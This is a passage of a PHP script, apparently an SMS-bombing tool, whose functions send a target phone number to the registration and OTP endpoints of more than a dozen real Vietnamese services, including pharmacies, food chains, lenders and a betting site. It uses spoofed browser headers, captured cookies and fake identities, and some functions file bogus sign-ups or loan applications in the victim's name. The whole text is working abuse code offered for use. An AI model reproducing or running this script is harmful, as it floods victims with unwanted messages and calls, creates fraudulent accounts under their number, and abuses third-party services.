		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded; charset=UTF-8",
		"origin: https://bapi.com.vn",
		"referer: https://bapi.com.vn/Login",
	);
	$data = 'Phone='.$sdt;
	$get = json(CURL("POST", "https://bapi.com.vn/Account/CheckUserLogin", $data, $head, false));
	if($get["message"] == "Mã xác thực đã được gửi vào số điện thoại của bạn"){
		return array("BAPI" => "Thành Công");
	} else {
		return array("BAPI" => "Thất Bại");
	}
}
function UBO($sdt){
	$head = array(
		"Host: ubofood.com",
		"Connection: keep-alive",
		"Accept: application/json, text/plain, */*",
		"User-Agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
		"Origin: https://ubofood.com",
		"Referer: https://ubofood.com/register",
	);
	$data = '{"phone_number":"'.$sdt.'","trade_code":"379760000"}';
	$get = json(CURL("POST", "https://ubofood.com/api/v1/account/customers/register", $data, $head, false));
	if($get["success"] == "1"){
		return array("UBO" => "Thành Công");
	} else {
		return array("UBO" => "Thất Bại");
	}
}
function SAPO($sdt){
	$head = array(
		"Host: www.sapo.vn",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded; charset=UTF-8",
		"accept: */*",
		"origin: https://www.sapo.vn",
		"referer: https://www.sapo.vn/dang-nhap-kenh-ban-hang.html",
		"cookie: _hjSessionUser_3167213=eyJpZCI6ImM5YjY5NjhhLTI3MWQtNWM2OC1hZDBjLTM3MTQxYmVhZTg0MCIsImNyZWF0ZWQiOjE2ODI3Nzk3NTMyNzEsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjIncludedInSessionSample_3167213=1;_hjSession_3167213=eyJpZCI6IjM0YWJlNDFhLWEzOWQtNDY4YS1iMTYwLWUxZmNkZTM4NjJkYyIsImNyZWF0ZWQiOjE2ODI3Nzk3NTMzNjAsImluU2FtcGxlIjp0cnVlfQ==;_hjAbsoluteSessionInProgress=0;landing_page=https://www.sapo.vn/dang-nhap-kenh-ban-hang.html;start_time=04/29/2023 21:49:14;pageview=1;G_ENABLED_IDPS=google;source=https://www.sapo.vn/dang-nhap-kenh-ban-hang.html"
	);
	$data = "FullName=Pro%20Pro&PhoneNumber=".$sdt."&StoreName=Pro%20Pro&CityDistrict=H%E1%BB%93%20Ch%C3%AD%20Minh%2C79&PackageType=web&Preferred=&SaleName=&Reference=&Source=https%3A%2F%2Fwww.sapo.vn%2Fdang-nhap-kenh-ban-hang.html&Referral=&Campaign=&LandingPage=https%3A%2F%2Fwww.sapo.vn%2Fdang-nhap-kenh-ban-hang.html&StartTime=04%2F29%2F2023%2021%3A49%3A14&EndTime=04%2F29%2F2023%2021%3A49%3A18&PageView=1&AffId=&AffTrackingId=&Type=1&SalesTeam=&City=H%E1%BB%93%20Ch%C3%AD%20Minh&CityId=79&Province=H%E1%BB%93%20Ch%C3%AD%20Minh&CityNameAndId=H%E1%BB%93%20Ch%C3%AD%20Minh%2C79&SocialSource=&FacebookName=&FacebookAvatar=";
	$get = json(CURL("POST", "https://www.sapo.vn/consultingrequest/registertrial", $data, $head, false));
	if($get["result"]["RegisterToken"]){
		return array("SAPO" => "Thành Công");
	} else {
		return array("SAPO" => "Thất Bại");
	}
}
function POPEYS($sdt){
	$head = array(
		"Host: api.popeyes.vn",
		"accept: application/json",
		"x-client: WebApp",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"origin: https://popeyes.vn",
		"referer: https://popeyes.vn/",
	);
	$data = '{"phone":"'.$sdt.'","firstName":"Pro","lastName":"Pro","email":"Khang@gmail.com"}';
	$get = json(CURL("POST", "https://api.popeyes.vn/api/v1/register", $data, $head, false));
	if($get["success"] == "1"){
		return array("POPEYS" => "Thành Công");
	} else {
		return array("POPEYS" => "Thất Bại");
	}
}
function PHARMACITY($sdt){
	$head = array(
		"Host: api-gateway.pharmacity.vn",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"accept: */*",
		"origin: https://www.pharmacity.vn",
		"referer: https://www.pharmacity.vn/",
	);
	$data = '{"phone":"'.$sdt.'","referral":""}';
	$get = json(CURL("POST", "https://api-gateway.pharmacity.vn/customers/register/otp", $data, $head, false));
	if($get["result"] == "success"){
		return array("PHARMACITY" => "Thành Công");
	} else {
		return array("PHARMACITY" => "Thất Bại");
	}
}
function MIOTO($sdt){
	$head = [
	    'Host: accounts.mioto.vn',
	    'content-length: 0',
	    'accept: application/json, text/plain, */*',
	    'user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
	    'origin: https://www.mioto.vn',
	    'x-requested-with: mark.via.gp',
	    'sec-fetch-site: same-site',
	    'sec-fetch-mode: cors',
	    'sec-fetch-dest: empty',
	    'referer: https://www.mioto.vn/',
	    'accept-encoding: gzip, deflate',
	    'accept-language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
	    'Content-Type: application/x-www-form-urlencoded',
	    'cookie: _fbp=fb.1.1682773000135.1896969688;_vid=CzE5entAXYz2vpDc;_hv=31cac6dc6cc2f9d36033dcdd9d8f1129aaf20d94a5d056dbebac93fe6ff7537f'
	];
	$get = json(CURL("POST", "https://accounts.mioto.vn/mapi/phone/otp/gen?phone=".$sdt."&action=2&otpBy=0", null, $head, false));
	if($get["errorMessage"] == "Thành công"){
		return array("MIOTO" => "Thành Công");
	} else {
		return array("MIOTO" => "Thất Bại");
	}
}
function KILO($sdt){
	$head = [
	    'Host: api.kilo.vn',
	    'content-length: 48',
	    'x-correlation-id: 6deeb659-f5d2-4607-9253-0e3a37161cd1',
	    'authorization: Bearer undefined',
	    'content-type: application/json',
	    'accept: application/json',
	    'user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
	    'i18next-language: vi',
	    'api-version: 2',
	    'platform: SELLER_WEB',
	    'app-version: 1',
	    'origin: https://seller.kilo.vn',
	    'x-requested-with: mark.via.gp',
	    'sec-fetch-site: same-site',
	    'sec-fetch-mode: cors',
	    'sec-fetch-dest: empty',
	    'referer: https://seller.kilo.vn/',
	    'accept-encoding: gzip, deflate',
	    'accept-language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
	];
	$data = '{"phone":"'.$sdt.'","email":"Khâng@gmil.com"}';
	$get = json(CURL("POST", "https://api.kilo.vn/users/check-new-user", $data, $head, false));
	if($get["message"] == "Success"){
		return array("KILO" => "Thành Công");
	} else {
		return array("KILO" => "Thất Bại");
	}
}
function ITAPHOA($sdt){
	$head = array(
		"Host: api.itaphoa.com",
		"region-code: HCM",
		"accept: application/json",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"origin: https://shop.mioapp.vn",
		"referer: https://shop.mioapp.vn/",
	);
	$get = json(CURL("GET", "https://api.itaphoa.com/customer/send-gen-otp?phone=".$sdt."&type=call", null, $head, false));
	if($get["status"] == "1"){
		return array("ITAPHOA" => "Thành Công");
	} else {
		return array("ITAPHOA" => "Thất Bại");
	}
}
function SRC8BET($sdt){
	$head =[
	'Host: m.src8.bet',
    'content-length: 42',
    'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile: ?1',
    'user-agent: Mozilla/5.0 (Linux; Android 10; RMX2021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36',
    'content-type: application/json',
    'content-language: vi-VN',
    'accept: application/json, text/plain, */*',
	'x-requested-with: XMLHttpRequest',
	'sec-ch-ua-platform: "Android"',
	'origin: https://m.src8.bet',
	'sec-fetch-site: same-origin',
	'sec-fetch-mode: cors',
	'sec-fetch-dest: empty',
	'referer: https://m.src8.bet/Account/Register',
	'accept-encoding: gzip, deflate, br',
	'accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
	];
	$data = '{"mobile":"'.$sdt.'","countryCode":"84"}';
	$get = json(CURL("POST", "https://m.src8.bet/api/1.0/phone/sendOtp", $data, $head, false));
	if($get["Code"] == "200"){
		return array("SRC8BET" => "Thành Công");
	} else {
		return array("SRC8BET" => "Thất Bại");
	}
}
function FPT($sdt){
	$head = array(
		"Host: api.nhathuoclongchau.com.vn",
		"access-control-allow-origin: *",
		"accept: application/json, text/plain, */*",
		"authorization: ",
		"order-channel: 1",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"origin: https://nhathuoclongchau.com.vn",
		"referer: https://nhathuoclongchau.com.vn/",
	);
	$data = '{"phoneNumber":"'.$sdt.'","fromSys":"WEBKHLC"}';
	$get = json(CURL("POST", "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification", $data, $head, false));
	if($get["expiredOtpTimeSecond"] == "299"){
		return array("FPT" => "Thành Công");
	} else {
		return array("FPT" => "Thất Bại");
	}
}
function VAMO($sdt){
	$sdt = "84".$sdt;
	$sdt = str_replace("840", "", $sdt);
	$head = array(
		"Host: vamo.vn",
		"accept: application/json, text/plain, */*",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"origin: https://vamo.vn",
		"referer: https://vamo.vn/app/application/client-registration?amount=2000000&term=7&phoneNumber=0373885558",
		"cookie: pll_language=vi"
	);
	$data = '{"firstName":"Pro","lastName":"Pro","gender":"MALE","email":"'.generateRandomString(20).'@gmail.com","password":"123456789","phoneNumber":"'.$sdt.'","applicationTerm":{"value":7,"unit":"DAYS"},"applicationAmount":2000000,"productType":"SHORT_TERM_FIRST_LOAN","productSubType":"FIRST_LOAN","faceBookData":{},"consents":{"VAMO_TERMS_AND_CONDITIONS":true},"loanApplicationReceiveChannel":"WEB"}';
	$get = CURL("POST", "https://vamo.vn/ws/api/public/registrations/clients", $data, $head, false);
	if($get == ""){
		return array("VAMO" => "Thành Công");
	} else {
		$data = '{"username":"'.$sdt.'"}';
		$get = json(CURL("POST", "https://vamo.vn/ws/api/public/login-with-otp/generate-otp", $data, $head, false));
		if($get["isValid"] == "true" or $get["isValid"] == "1" or $get["isValid"] == "True"){
			return array("VAMO" => "Thành Công");
		} else {
			return array("VAMO" => "Thất Bại");
		}
	}
}
function SENMO($sdt){
	$sdt = "84".$sdt;
	$sdt = str_replace("840", "", $sdt);
	$head = array(
		"Host: api.senmo.vn",
		"accept-language: vi",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"accept: */*",
		"origin: https://senmo.vn",
		"referer: https://senmo.vn/user/registration/reg1",
		"accept-encoding: gzip, deflate"
	);
	$data = '{"full_name":"Pro Pro","first_name":"Pro","last_name":"Pro","mobile_phone":"84'.$sdt.'","target_url":"senmo.vn/?utm_source=direct&utm_medium=direct&utm_campaign=direct"}';
	$get = json(CURL("POST", "https://api.senmo.vn/api/user", $data, $head, false));
	if($get["fields"][0]["message"] == "Số điện thoại đã được sử dụng."){
		$data= '{"phone":"84'.$sdt.'"}';
		$get = json(CURL("POST", "https://api.senmo.vn/api/user/send-one-time-password", $data, $head, false));
	} else {
		$token = $get["token"];
		$head = array(
			"Host: api.senmo.vn",
			"accept-language: vi",
			"authorization: Bearer ".$token,
			"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept: */*",
			"origin: https://senmo.vn",
			"referer: https://senmo.vn/user/registration/reg1",
		);
		$get = json(CURL("GET", "https://api.senmo.vn/api/user/phone-confirmation-code", null, $head, false));
	}
	if($get["phone_confirmation_type"] =="sms"){
		return array("SENMO" => "Thành Công");
	} else {
		return array("SENMO" => "Thất Bại");
	}
}
function INTERLOAD($sdt){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://backend.interloan.tech/api/v1/users/phone_check');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
	curl_setopt($ch, CURLOPT_HTTPHEADER, [
	    'Accept: application/json, text/plain, */*, application/json',
	    'Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
	    'Connection: keep-alive',
	    'Content-Type: application/json',
	    'Origin: https://interloan.vn',
	    'Referer: https://interloan.vn/',
	    'Sec-Fetch-Dest: empty',
	    'Sec-Fetch-Mode: cors',
	    'Sec-Fetch-Site: cross-site',
	    'User-Agent: Mozilla/5.0 (Linux; Android 12; SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua: "Not:A-Brand";v="99", "Chromium";v="112"',
	    'sec-ch-ua-mobile: ?1',
	    'sec-ch-ua-platform: "Android"',
	    'Accept-Encoding: gzip',
	]);
	curl_setopt($ch, CURLOPT_POSTFIELDS, '{"phone":"'.$sdt.'","user_type":"borrower"}');
	$get = json(curl_exec($ch));
	if($get["status"] == "success"){
		return array("INTERLOAD" => "Thành Công");
	} else {
		return array("INTERLOAD" => "Thất Bại");
	}
}
function CURL($method, $url, $data, $head, $headers){
	$ch = curl_init();
		curl_setopt_array($ch, array(
			CURLOPT_URL => $url,
			CURLOPT_HTTPHEADER => $head,
			CURLOPT_POSTFIELDS => $data,
			CURLOPT_CUSTOMREQUEST => $method,
			CURLOPT_ENCODING => '',
			CURLOPT_HEADER => $headers,
			CURLOPT_POST => TRUE,
			CURLOPT_RETURNTRANSFER => 1,
			CURLOPT_FOLLOWLOCATION => TRUE
		));
	$access = curl_exec($ch); 
	return $access;
}
function json($data){
	return json_decode($data,true);
}
function generateRandom($length) {
	$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}
function generateRandomString($length) {
	$characters = '0123456789abcdef';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}
function generateImei() {
	return generateRandomString(8) . '-' . generateRandomString(4) . '-' . generateRandomString(4) . '-' . generateRandomString(4) . '-' . generateRandomString(12);
}
function get_string($data) {
	return str_replace(array('<',"'",'>','?','/',"\\",'--','eval(','<php','-'),array('','','','','','','','','',''),htmlspecialchars(addslashes(strip_tags($data))));
}
function get_microtime() {
	return round(microtime(true) * 1000);
}
function get_TOKEN() {
	return generateRandom(22).':'.generateRandom(9).'-'.generateRandom(20).'-'.generateRandom(12).'-'.generateRandom(7).'-'.generateRandom(7).'-'.generateRandom(53).'-'.generateRandom(9).'_'.generateRandom(11).'-'.generateRandom(4);
}
function get_SECUREID($length = 17) {
	$characters = '0123456789abcdef';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}
function generateRandomstr($length) {
	$characters = '0123456789';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}
function ECHOJSON($data){
	return json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
}
function GET($data){
	return json(file_get_contents($data));
}
